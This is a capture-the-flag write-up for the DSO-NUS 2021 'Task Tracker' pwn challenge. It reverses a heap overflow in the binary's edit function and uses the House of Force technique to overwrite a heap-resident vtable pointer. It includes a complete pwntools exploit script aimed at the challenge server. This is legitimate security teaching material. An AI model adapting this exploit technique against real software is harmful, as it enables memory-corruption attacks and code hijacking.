---
title: "Task Tracker [400]"
tags: [DSO-NUS 2021, Binary Exploitation]
excerpt: "Binary Exploitation"
layout: single
classes: wide
--- 

**Category:** Pwn

## Challenge Description

> To identify the imposter, Red has programmed a task tracker to keep track of all tasks completed. However, one of the imposters have sabotaged some of the code to make it vulnerable. Can you leverage on the vulnerability to get the secret intel?

[Challenge Files](https://github.com/MiloTruck/CTF-Archive/tree/master/DSO%20NUS%20CTF/Binary%20Exploitation/Task%20Tracker){: .btn .btn--primary}

## Initial Analysis
We are provided with a 64-bit ELF executable:
```shell
$ file tasktracker
tasktracker: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=40ae7a4291500370ce2158854195477ecf9875b3, stripped
```

When the binary is executed, we are provided with a menu, which looks like a heap challenge:
```shell
$ ./tasktracker
Welcome to the dropship. There is one imposter among us
******************************************************************************
Secure TaskTracker! Better than Medbay Scan at identifying imposters!
******************************************************************************
1.Show list of tasks
2.Add a task
3.Change a task (That is what an imposter would do :o)
4.Activate Communications
5.Call Emergency Meeting
******************************************************************************
Your choice:
```

By analyzing the file in IDA, we will know what each of these options do. The decompilation of `main()` is as shown below:
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  void (**vtable)(void); // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  vtable = malloc(48LL);
  *vtable = start_message;
  vtable[1] = list_tasks;
  vtable[2] = add;
  vtable[3] = edit;
  vtable[4] = comms;
  vtable[5] = end;
  (*vtable)();
  while ( 1 )
  {
    print_banner();
    read(0LL, buf, 8LL);
    switch ( atoi(buf) )
    {
      case 1u:
        vtable[1]();
        break;
      case 2u:
        vtable[2]();
        break;
      case 3u:
        vtable[3]();
        break;
      case 4u:
        vtable[4]();
        break;
      case 5u:
        vtable[5]();
        exit(0LL);
        return result;
      default:
        output("Invalid Option. Not sure if you have butter fingers, but you deserve to be voted out anyways.", buf);
        break;
    }
  }
}
```

`main()` simply prints out the starting banner and the menu, and proceeds to handle our input using a `switch`. However, it is important to note that the functions to be called, such as `list_tasks()`, are stored and referenced through a `vtable`. This `vtable` is stored on the heap, as seen by the `malloc()` call:
```c
vtable = malloc(48LL);
```

After looking through the decompiled code for each function, I realized only `add()` and `edit()` will be relevant to our exploit. `list_tasks()` simply prints out the contents of the heap in this format:

```c
Your choice: 1
Task Number: 0  Task Name : AAAAAAAA
Task Number: 1  Task Name : BBBBBBBB
```

`end()` causes the program to exit immediately, while `comms()` prints this banner:
```c
Your choice: 4
-. .. -.-. .
- .-. -.-- --..--
.. -- .--. --- ... - . .-. .-.-.-
-... ..- -
..
-.-. .- -.
- . .-.. .-..
-.-- --- ..-
-- -.--
--. .-.. .. -... -.-.
...- . .-. ... .. --- -.
.. ...
..--- .-.-.- ..--- --... .-.-.-
```
The simplified code of `add()` is as follows:

```c
__int64 __fastcall add()
{
  int i; // [rsp+4h] [rbp-1Ch]
  int size; // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v10; // [rsp+18h] [rbp-8h]

  if ( chunk_count > 49 )
  {
    output("All tasks have been tracked. Call the Emergency Meeting!", a2);
  }
  else
  {
    printf("Please enter the length of task name:");
    read(0, buf, 8uLL);
    size = atoi(buf);
    if ( !size )
    {
      output("Are you an imposter?", buf);
      goto end;
    }
    for ( i = 0; i <= 49; ++i )
    {
      if ( !heap_chunks[2 * i] )
      {
        heap_chunks[2 * i] = malloc(size);
        printf("Please enter the name of task:");
        *(heap_chunks[2 * i] + read(0, heap_chunks[2 * i], size)) = 0;
        ++chunk_count;
        break;
      }
    }
  }
end:
  return 0;
}
```

The function first checks if `chunk_count`, the number of allocated chunks, exceeds 49. If it does not, we are asked for a length, which will be the size of the newly allocated chunk: 
```c
printf("Please enter the length of task name:");
read(0, buf, 8uLL);
size = atoi(buf);
```

The function then looks for an unused index in `heap_chunks`, and stores the pointer returned by `malloc()` at that index. Next, we are asked for the "name of task", which will be read and stored in the newly allocated heap chunk. 
```c
 for ( i = 0; i <= 49; ++i )
    {
      if ( !heap_chunks[2 * i] )
      {
        heap_chunks[2 * i] = malloc(size);
        printf("Please enter the name of task:");
        *(heap_chunks[2 * i] + read(0, heap_chunks[2 * i], size)) = 0;
        ++chunk_count;
        break;
      }
    }
```

From reversing `add()`, we note that we are able to:
* Allocate a heap chunk of any size
* Allocate up to 50 chunks

Next, we take a look at the code of `edit()`:
```c
unsigned __int64 __fastcall edit(__int64 a1, __int64 a2)
{
  int index; // [rsp+4h] [rbp-2Ch]
  int size; // [rsp+8h] [rbp-28h]
  char buf[16]; // [rsp+10h] [rbp-20h] BYREF
  char buf_2[8]; // [rsp+20h] [rbp-10h] BYREF

  if ( chunk_count )
  {
    printf("Please enter the index of the task you want to change:");
    read(0, buf, 8uLL);
    index = atoi(buf);
    if ( heap_chunks[2 * index] )
    {
      printf("Enter the length of task name:");
      read(0, buf_2, 8uLL);
      size = atoi(buf_2);
      printf("Enter the new task name:");
      *(heap_chunks[2 * index] + read(0, heap_chunks[2 * index], size)) = 0;
    }
    else
    {
      output("That is what an imposter would say.", buf);
    }
  }
  else
  {
    output("Are you doing your tasks?", a2);
  }
  return;
}
```

The function first checks if a chunk is allocated using `chunk_count`. If so, it asks for the index of the chunk we wish to edit:
```c
printf("Please enter the index of the task you want to change:");
read(0, buf, 8uLL);
index = atoi(buf);
```

The vulnerability lies in the following part of the code. The program checks if the index we entered is valid using `heap_chunks`. Next, we are once again asked for a length, followed by new data we wish to write into the chunk.
```c
if ( heap_chunks[2 * index] )
{
    printf("Enter the length of task name:");
    read(0, buf_2, 8uLL);
    size = atoi(buf_2);
    printf("Enter the new task name:");
    *(heap_chunks[2 * index] + read(0, heap_chunks[2 * index], size)) = 0;
}
```

Notice how the function does not check if `size` is smaller or equal to the actual size of the allocated chunk. This allows us to cause a heap overflow and overwrite other chunks or data on the heap.

Also, while I was halfway into solving the challenge, I also noticed there was a function to print the flag at `0x400D51`, which was very useful:
```c
void __noreturn print_flag()
{
  unsigned int f; // [rsp+Ch] [rbp-54h]
  char buf[72]; // [rsp+10h] [rbp-50h] BYREF

  f = fopen("flag.txt", 0LL);
  read(f, buf, 0x40uLL);
  printf("%s", buf);
  exit(0LL);
}
```

## Exploitation: House of Force
From reversing the binary, we know that we can:
* Overwrite any data on the heap using the heap overflow
* Allocate a heap chunk of any size
* Allocate up to 50 chunks

Using this, we will be able to write data to any address relative to the heap using the **House of Force**. I won't explain the **House of Force** in detail, but you can refer to these explanations should you wish to understand better:
* [heap-exploitation: House of Force](https://heap-exploitation.dhavalkapil.com/attacks/house_of_force)
* [lazenca TechNote: The House of Force](https://www.lazenca.net/pages/viewpage.action?pageId=51970155)

Usually, **House of Force** would require a heap address leak to gain an arbitrary write. However, in this challenge, we can simply write the address of `print_flag()` into `vtable`, which is stored on the heap. This does not require a heap address leak, as the address we want to overwrite (`vtable`) is relative to the chunks allocated by us.

The exploitation process is as follows:  
1. Using the heap overflow, overwrite the `top_chunk` with `0xffffffffffffffff`. This would allow us to allocate a chunk with an absurdly large size.
2.  Allocate a chunk with a size of `offset`. As the address of `vtable` is less than the address of the `top_chunk`, `offset` is calculated by: `offset = -(top_chunk - target + chunk_size)`. `chunk_size` refers to the size of the final chunk we will allocate.
3. Allocate a final chunk, this chunk will be allocated at the address of `target`.
4. Using `edit()`, overwrite the one of the `vtable` pointers with `print_flag()`.
5. Call `print_flag()` normally using the menu options.

To overwrite the `top_chunk`, we simply allocate a chunk of size 8 and use `edit()` to overflow the `top_chunk`.
```python
# Overwrite top chunk size with 0xffffffffffffffff
payload = "A"*24 + p64(0xffffffffffffffff)
malloc(8, "A"*8)
edit(0, 64, payload)
```

We then calculate the `offset` with the method mentioned above. The addresses of `vtable` and `top_chunk` can be obtained by analyzing the heap using `gdb`. Note that their values will be different every run.
```python
# Calculating the value of offset    
target = 0x1802860  # Address of vtable
top_chunk = 0x18028f0
offset = top_chunk - target + 8
```

The chunk with size `offset` is then allocated:
```python
# Allocate absurdly large chunk, which will wrap around memory
malloc(-offset, p64(0x0))
```

The final chunk we allocate will be at the address of `vtable`. This is the chunk we use to overwrite one of the `vtable` pointers.
```python
# Allocate chunk at vtable
malloc(8, p64(0xdeadbeef)
```

We edit the final chunk and overwrite the value of the first `vtable` pointer, which is the function that is called when we select `1` on the menu.
```python
# Overwrite first option in vtable with print_flag()
print_flag = 0x0000000000400D51
payload = "A"*56 + p64(print_flag)
edit(2, 100, payload)
```

Lastly, we select `1`, which causes the program to call `print_flag()`:
```python
# Calling print_flag()
sla('Your choice:', '1')
```

Running the exploit prints the flag successfully:
```python
$ python solve.py
[*] '/mnt/c/Users/brand/Downloads/Task Tracker/tasktracker'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/mnt/c/Users/brand/Downloads/Task Tracker/tasktracker': pid 1782
[*] Paused (press any to continue)
[*] Switching to interactive mode
******************************************************************************
Secure TaskTracker! Better than Medbay Scan at identifying imposters!
******************************************************************************
1.Show list of tasks
2.Add a task
3.Change a task (That is what an imposter would do :o)
4.Activate Communications
5.Call Emergency Meeting
******************************************************************************
Your choice:[*] Process '/mnt/c/Users/brand/Downloads/Task Tracker/tasktracker' stopped with exit code 0 (pid 1782)
DSO-NUS{fake_flag}
```

Full exploit code:
```python
from pwn import *
import sys

exe = ELF("./tasktracker")
host = "ctf-85ib.balancedcompo.site"
port = 9997

def malloc(size, data):
    sla('Your choice:', '2')
    sla('Please enter the length of task name:', str(size))
    sla('Please enter the name of task:', data)

def edit(index, size, data):
    sla('Your choice:', '3')
    sla('Please enter the index of the task you want to change:', str(index))
    sla('Enter the length of task name:', str(size))
    sla('Enter the new task name:', data)

def exploit(p):
    # Overwrite top chunk size with 0xffffffffffffffff
    payload = "A"*24 + p64(0xffffffffffffffff)
    malloc(8, "A"*8)
    edit(0, 64, payload)

    # Calculating the value of offset    
    target = 0x1802860
    top_chunk = 0x18028f0
    offset = top_chunk - target + 8

    # Allocate absurdly large chunk, which will wrap around memory
    malloc(-offset, p64(0x0))

    # Allocate chunk at vtable
    malloc(8, p64(0xdeadbeef))
    
    # Overwrite first option in vtable with print_flag()
    print_flag = 0x0000000000400D51
    payload = "A"*56 + p64(print_flag)
    edit(2, 100, payload)

    # Calling print_flag()
    sla('Your choice:', '1')

    p.interactive()

if __name__ == "__main__":
    context.binary = exe

    if sys.argv[-1] == "remote":
        p = remote(host, port)
    else:
        p = process([exe.path])
        pause()

    sl = lambda a: p.sendline(a)
    sla = lambda a,b: p.sendlineafter(a,b)
    lg = lambda a : log.info(a)

    exploit(p)
```